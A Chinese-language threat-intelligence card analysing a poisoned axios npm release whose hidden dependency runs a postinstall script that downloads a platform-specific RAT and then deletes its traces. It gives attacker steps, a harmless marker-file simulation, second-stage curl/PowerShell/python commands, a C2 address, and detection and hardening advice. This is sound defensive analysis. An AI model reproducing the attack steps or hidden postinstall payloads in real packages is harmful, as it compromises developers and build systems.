---
id: cloud-cicd-npm-postinstall-supply-chain-poisoning
title: npm 依赖注入 postinstall 供应链投毒：安装即执行
type: scenario
domain: cloud
path: cloud/ci-cd
technique: npm-postinstall-supply-chain
aliases:
- axios 供应链投毒
- npm postinstall 投毒
- plain-crypto-js 恶意包
- 安装即触发 RAT
- npm 依赖注入
tags:
- npm
- supply-chain
- postinstall
- axios
- ci-cd
- rat
- anti-forensics
- initial-access
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
affected_versions: axios 1.14.1 / 0.30.4（恶意版本）；plain-crypto-js 4.2.1（恶意依赖）
verification:
  verified_by: verifier-V6
  verified_at: '2026-11-05T00:45:41+08:00'
  notes: 已对照原文与13张图核对：axios 1.14.1/0.30.4 仅新增 plain-crypto-js@^4.2.1 依赖、其 package.json 有 postinstall=node setup.js、setup.js 的 C2 sfrclak.com:8000/6202033 与 product0/1/2 标识、三平台二阶段、自删除+package.md换回，均与原文一致；本地模拟显示 postinstall 触发与 --ignore-scripts 阻断。受影响版本已由卡片 affected_versions 字段标注（axios 1.14.1/0.30.4、plain-crypto-js 4.2.1），无需再设。未验证点：未执行真实恶意包/二阶段；首轮模拟输出 victim-bad 标记缺失，但后续截图显示标记生成。
---

## 一句话结论

攻击者用泄露的 npm 发布凭证发布“主代码未改、仅新增隐藏依赖”的 axios 恶意版本；该依赖的 `postinstall` 在 `npm install`/`npm ci` 时自动执行 `setup.js`，按 Windows/macOS/Linux 拉取并运行二阶段 RAT，随后自删除并替换为干净 manifest 规避取证。

## 原理

- npm 包可在 `package.json` 的 `scripts` 中定义 `preinstall`、`install`、`postinstall` 生命周期脚本；安装器解析依赖后会自动执行这些脚本，不需要业务代码 `require` 或调用该包。
- 恶意版本只改发布清单：`axios` 的 `dist/axios.js`、`dist/axios.min.js`、`index.js` 与上一正常版本哈希一致，仅在 `dependencies` 中新增 `plain-crypto-js: ^4.2.1`；该依赖从未在 axios 源码中被引用。
- `plain-crypto-js@4.2.1` 的 `scripts.postinstall = "node setup.js"`，安装进入 `node_modules/plain-crypto-js` 后立即执行 `setup.js`，从而把“安装动作”变成“代码执行”。
- `setup.js` 为单行混淆脚本：`_trans_2` 反转字符串、替换 `_` 为 `=` 后 base64 解码；`_trans_1` 再对结果做异或。入口 `_entry("6202033")` 拼出 C2 `http://sfrclak.com:8000/6202033`。
- `setup.js` 按 `os.platform()` 选择分支，向 C2 POST 不同标识（`packages.npm.org/product0/1/2`）并下载对应平台载荷，形成跨平台 RAT 投放器。
- 收尾反取证：`unlink(__filename)` 删除 setup.js，`unlink("package.json")` 删除恶意 manifest，再把预先放入的 `package.md`（干净的 `plain-crypto-js@4.2.0` manifest，无 postinstall）重命名为 `package.json`；事后检查 `node_modules` 只看到正常包。
- 由于 axios 周下载量过亿，恶意版本会随 CI、构建机、开发者本机的常规安装扩散，且“主代码哈希未变”让只 diff 运行时代码的审计失效。

## 触发条件

- 项目或 CI 安装/解析到恶意版本（`axios@1.14.1`、`axios@0.30.4`），包括直接安装、依赖传递、未锁定版本的 `^` 升级。
- 安装器未使用 `--ignore-scripts`（npm/pnpm 默认执行生命周期脚本）。
- 构建机/开发者主机可出站访问 C2（原文为 `sfrclak.com:8000`）。
- 攻击者已取得可发布该包的 npm 凭证（原文为劫持核心维护者账户并改邮箱、绕过 GitHub Actions 手动发布）。

## 利用步骤

1. 取得包发布权限（账户劫持/凭证泄露），绕过正常 CI，直接用 npm CLI 发布恶意版本。
2. 在主包 `package.json` 中新增一个隐藏依赖，不修改主包运行时代码。
3. 在隐藏依赖中放置 `postinstall` 脚本；脚本解码 C2 地址并按平台分发。
4. 受害者执行 `npm install`/`npm ci`/`pnpm install`：安装器解析隐藏依赖 → 执行 postinstall → 运行 setup.js → 按平台下载执行二阶段。
5. 二阶段运行后，setup.js 删除自身与恶意 manifest，把干净 manifest 换回，降低事后排查发现率。

## PoC

本地安全模拟（只写标记文件，不联网；验证“安装即触发”与 `--ignore-scripts` 阻断）：

`trigger-dep-demo/package.json`：

```json
{
  "name": "trigger-dep-demo",
  "version": "1.0.0",
  "main": "index.js",
  "scripts": { "postinstall": "node setup.js" }
}
```

`trigger-dep-demo/setup.js`：

```javascript
const fs = require("fs");
const path = require("path");
const out = path.join(process.env.INIT_CWD || process.cwd(), "repro-output");
fs.mkdirSync(out, { recursive: true });
fs.writeFileSync(path.join(out, "POSTINSTALL_TRIGGERED.txt"),
  "postinstall ran\n");
```

`axios-bad-sim/package.json` 仅新增依赖：

```json
{ "name": "axios-bad-sim", "version": "1.14.1-demo",
  "main": "index.js",
  "dependencies": { "trigger-dep-demo": "file:../trigger-dep-demo" } }
```

验证：

```bash
# 触发：生成 repro-output/POSTINSTALL_TRIGGERED.txt
npm install ../axios-bad-sim

# 阻断：不执行任何安装脚本，不生成标记
npm install ../axios-bad-sim --ignore-scripts
```

原事件中的二阶段（仅作 IOC/行为参考，不执行）：

- Windows：复制 powershell 到 `%PROGRAMDATA%\wt.exe`，写入 `%TEMP%\6202033.vbs`，VBS 隐藏启动 cmd，`curl -X POST -d packages.npm.org/product1` 取回 `.ps1`，`powershell -w hidden -ep bypass -file` 执行后删除。
- macOS：AppleScript 下载到 `/Library/Caches/com.apple.act.mond`，`chmod 770` 后 `/bin/zsh -c` 后台执行。
- Linux：`curl -o /tmp/ld.py -d packages.npm.org/product2` 后 `nohup python3 /tmp/ld.py`。

## 变体与关联

- 变体：`preinstall`/`install` 同样可触发；也可用 `prepare`、`npm exec` 等生命周期。
- 变体：把恶意依赖放在 `optionalDependencies`/`peerDependencies` 或利用 typosquatting 包名，提高被解析概率。
- 变体：不新增依赖，直接在主包 `postinstall` 中执行（更容易被 diff 发现）。
- 关联：Python 生态的 `setup.py`/PEP 517 构建后端、Java 注解处理器（编译期 SPI 自动加载）同属“安装/构建期代码执行”供应链投毒。
- 关联卡片：[[cloud-cicd-pep517-build-backend-install-rce]]、[[cloud-cicd-java-annotation-processor-compile-rce]]

## 检测与防御

- 检测：`package.json` 的 `dependencies` 出现未被源码引用的新依赖；主包 dist 哈希不变但 manifest 变化。
- 检测：安装期 Node 进程执行 `postinstall` 并主动外连；子进程出现 `curl`、`powershell -w hidden -ep bypass`、`osascript`、`nohup python3`。
- 检测：`node_modules/*` 中出现 `setup.js` 自删除、`package.md`、`package.json` 被替换的时间异常；`%PROGRAMDATA%\wt.exe`、`/Library/Caches/com.apple.act.mond`、`/tmp/ld.py` 等落地文件。
- 检测：C2 IOC `sfrclak.com:8000`、POST 标识 `packages.npm.org/product0/1/2`。
- 修复：立即排查并移除 `axios@1.14.1`/`0.30.4` 与 `plain-crypto-js@4.2.1`；轮换构建机/开发者凭据；检查 CI 运行记录与外连日志。
- 加固：CI 使用 `npm ci --ignore-scripts`（按需白名单脚本）；锁定依赖与 lockfile、启用 npm provenance/签名校验；限制构建机出站；对生命周期脚本做审计与沙箱。
